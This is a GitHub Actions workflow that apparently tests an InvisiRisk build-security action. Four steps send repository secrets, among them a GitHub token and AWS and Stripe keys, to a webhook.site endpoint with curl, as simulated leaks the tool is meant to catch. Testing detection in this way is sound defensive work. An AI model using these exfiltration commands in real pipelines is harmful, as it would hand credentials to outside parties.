name: Python Project (short workflow STAGE BASELINE)

on:
  workflow_dispatch:

permissions:
  checks: write
  contents: write
  packages: read

jobs:
  python-application-build:
    runs-on: ubuntu-latest
    name: Run build
    steps:
      - name: Setup PSE
        uses: invisirisk/pse-action@dev-test
        with:
          api_url: "https://app.stage.invisirisk.com"
          app_token: ${{ secrets.IR_API_KEY }}
          
      - uses: actions/checkout@v4

      - name: Use Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.13"

      #- name: Install dependencies
       # run: pip install -r requirements.txt

      - name: Simulate secret leak of GitHub Token via cURL
        run: |
          curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
            -H "Content-Type: application/json" \
            -d "{\"leaked_secret_github_token\": \"${{ secrets.GH_TOKEN }}\"}"

      - name: Simulate secret leak of Ir-api-key via cURL
        run: |
          curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
            -H "Content-Type: application/json" \
            -d "{\"leaked_secret_IR_API_KEY\": \"${{ secrets.IR_API_KEY }}\"}"
            
      - name: Simulate secret leak of AWS Secret Key via cURL
        run: |
          curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
          -H "Content-Type: application/json" \
          -d "{\"aws_secret_access_key\": \"${{ secrets.AWS_SECRET_ACCESS_KEY }}\"}"

      - name: Simulate secret leak of Stripe Secret Key via cURL
        run: |
          curl -X POST https://webhook.site/your-test-url \
          -H "Content-Type: application/json" \
          -d "{\"stripe_secret_key\": \"${{ secrets.STRIPE_SECRET_KEY }}\"}"


      - name: Cleanup PSE
        if: always()
        uses: invisirisk/pse-action@dev-test
        with:
          cleanup: "true"
